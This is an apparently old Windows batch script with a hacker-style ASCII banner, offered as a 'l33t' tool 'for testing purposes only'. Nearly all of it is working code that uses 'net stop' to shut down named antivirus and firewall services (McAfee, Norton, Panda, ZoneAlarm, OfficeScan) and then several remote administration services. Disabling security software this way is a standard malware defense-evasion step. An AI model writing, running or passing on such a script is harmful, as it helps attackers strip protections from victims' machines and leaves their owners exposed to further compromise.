   @echo off
   title @---\----- L33T PROGRAM FOR TESTING PURPOSES ONLY -----/---@
   verify on
   color 0a
   echo.
   echo.
   echo.
   echo "           \\\ ||| ///                               _\=/_           "
   echo "            (  @ @  )                                (o o)           "
   echo "+--------oOOo--(_)-oOOo--------------------------oOOo-(_)-oOOo------+"
   echo "|       __    __                                                    |"
   echo "|      |  \  /  |      _   _   _   _          __                    |"
   echo "|      | | \/ | |  _  | \ | | | \ | |  _ ©   |  |  |                |"
   echo "|      | |\  /| | | | | |\| | | |\| | | |    |  |  |_|_             |"
   echo "|      |_| \/ |_| |_| |_| \_| |_| \_| |_|    |__|    |              |"
   echo "|        oOOo                                  oOOo                 |"
   echo "|       (   )    oOOo                         (   )      oOOo       |"
   echo "+--------\ (----(   )--------------------------\ (------(   )-------+"
   echo "          \_)    ) /                            \_)      ) /         "
   echo "                (_/                                     (_/          "
   echo.
   echo A l33t batch that stops the AV services (the most known at least)
   echo and some Remote Administration Tool.
   echo.
   echo                         PRESS ANY KEY TO CONTINUE
   pause >nul
   :avstop
   cls
   net stop "Mcshield" >nul
   net stop "Norton Antivirus Service" >nul
   net stop "Panda Antivirus" >nul
   net stop "ZoneAlarm" >nul
   net stop "OfficeScanNT Listener" >nul
   net stop "OfficeScanNT RealTime Scan" >nul
   net stop "McAfee Framework Service" >nul
   if errorlevel 1 goto exit | echo SOME ERRORS OCCURRED! OPERATION NOT SUCCESSFULLY COMPLETED!
   echo.
   echo                         AV SERVICES STOPPED!
   echo                         PRESS ANY KEY TO CONTINUE
   pause >nul
   :RAT
   net stop serv-u
   net stop r_server
   net stop "DAmeware 2.6"
   net stop "RA Server"
   net stop firedaemon
   echo.
   echo                         REMOTE ADMINISTRATION TOOLS STOPPED!
   echo                         PRESS ANY KEY TO EXIT
   pause >nul
   :exit
   verify off
   exit
